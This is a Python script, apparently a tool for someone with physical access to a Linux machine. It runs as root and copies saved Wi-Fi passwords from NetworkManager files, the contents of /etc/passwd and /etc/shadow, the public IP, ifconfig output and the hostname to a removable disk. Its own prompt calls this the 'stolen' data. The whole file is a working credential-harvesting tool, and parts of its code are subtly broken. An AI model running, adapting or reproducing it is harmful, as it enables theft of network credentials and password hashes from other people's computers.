import requests
import socket
import subprocess
import sys
import os

if(os.getuid==1000):
	print("Run this command as sudo dummy.")
	quit()
else:
	name=input("Enter the name of the user you are booting on: ")
	disks_available=subprocess.check_output(["ls","/dev/disk/by-label"],encoding='utf-8')
	disks_available=disks_available.split("\n")
	disks_available.remove("")

	print(disks_available)

	go=True

	while go:

		try:
	
			print("Choose from the following disks to paste stolen the data to: ")
			count=[]
			for disks in range(len(disks_available)):
				print(f"[{disks+1}.] {disks_available[disks]}\n")
				count.append(disks+1)
			disk=int(input("--> "))

			if(disk in count):
				go=False
				disk_name=disks_available[disk-1]
				print(f"Driver to copy selected: {disk}")
			else:
				print("Please select a number between 1 and 3")
				go=True

		except:
			print("Select the correct option.\n\n")
			go=True

	list_dir=subprocess.check_output("ls /etc/NetworkManager/system-connections".split(), encoding='utf-8')
	ssids=list_dir.split('\n')
	ssids.remove('')

	wifi_password=""

	for ssid in ssids:
		wifi_password=subprocess.check_output(["cat",f"/etc/NetworkManager/system-connections/{ssid}"], encoding='utf-8')
		wifi_passwords=wifi_password+"\n"

	passwd=subprocess.check_output(["cat","/etc/passwd"],encoding='utf-8')
	encrypted=subprocess.check_output(["cat","/etc/shadow"], encoding='utf-8')

	try:
		ip=requests.get("https://api.ipify.org", timeout=10)
	except:
		ip="Either not connected to the internet or connection too slow."

	ifconfig=subprocess.check_output(["ifconfig"], encoding='utf-8')
	f=open(f"/media/{name}/{disk_name}/dataaboutthepc.txt",'w+')
	f.write(f"Wi-Fi Passwords:\n\n{wifi_passwords}\n\n\nAccount Information and Password Hashes(from /etc/passwd and /etc/shadow:\n\n {passwd}\n\n{encrypted}\n\nPublic IP Address of the computer:{ip.text}\n\nifconfig output: {ifconfig}\n\nHostname: {socket.gethostname()}")
	f.close()

	print("Done.")
